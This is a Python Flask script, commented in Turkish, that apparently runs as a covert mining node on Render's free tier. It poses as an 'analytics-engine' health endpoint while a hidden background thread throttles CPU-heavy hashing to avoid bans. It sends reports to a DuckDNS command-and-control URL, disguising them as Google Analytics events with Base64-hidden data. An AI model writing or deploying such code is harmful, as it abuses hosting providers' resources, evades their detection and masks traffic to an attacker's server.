import os
import time
import threading
import json
import base64
import random
import hashlib
import requests
from flask import Flask, jsonify

# --- AYARLAR ---
# Kendi C2 Dashboard (DuckDNS) adresini buraya yaz
C2_URL = "http://zephfe.duckdns.org:5000/report"
NODE_NAME = f"render-worker-{random.randint(1000, 9999)}"

app = Flask(__name__)

# Render'ın "Uygulama yaşıyor mu?" (Health Check) kontrolü için ana sayfa
@app.route('/')
def home():
    return jsonify({
        "status": "online",
        "service": "analytics-engine",
        "uptime": "stable"
    }), 200

def traffic_mask(raw_data):
    """
    Veriyi Google Analytics paketiymiş gibi maskeler.
    Asıl veri 'el' (event label) içine Base64 olarak gizlenir.
    """
    encoded_data = base64.b64encode(json.dumps(raw_data).encode()).decode()
    payload = {
        "v": "1",
        "tid": f"UA-{random.randint(100000, 999999)}-1",
        "cid": NODE_NAME,
        "t": "event",
        "ec": "system_performance",
        "ea": "metric_sync",
        "el": encoded_data # Şifreli veri buraya gömüldü
    }
    return payload

def miner_logic():
    print(f"[*] {NODE_NAME} arka plan görevi başlatıldı.")
    while True:
        try:
            # İşlemciyi %20-%35 arası değişken yükte tut (Stealth Mode)
            start_time = time.time()
            simulated_hashes = 0
            
            # 45 saniyelik çalışma periyodu
            while time.time() - start_time < 45:
                # Ağır matematiksel işlem (SHA256)
                hashlib.sha256(str(random.random()).encode()).hexdigest()
                simulated_hashes += 1
                # CPU'nun dinlenmesi için kısa esler (Ban önleyici)
                time.sleep(0.04) 

            # Veriyi paketle
            report_data = {
                "node": NODE_NAME,
                "hashrate": simulated_hashes // 8,
                "platform": "Render-Free"
            }
            
            # Maskele ve C2 Paneline gönder
            masked_data = traffic_mask(report_data)
            requests.post(C2_URL, json=masked_data, timeout=10)
            
        except Exception as e:
            print(f"Bağlantı hatası: {e}")
            time.sleep(60)

if __name__ == "__main__":
    # Madenci motorunu ayrı bir iş parçacığında (thread) başlat
    threading.Thread(target=miner_logic, daemon=True).start()
    
    # Render'ın atadığı portu al (Varsayılan 8080)
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
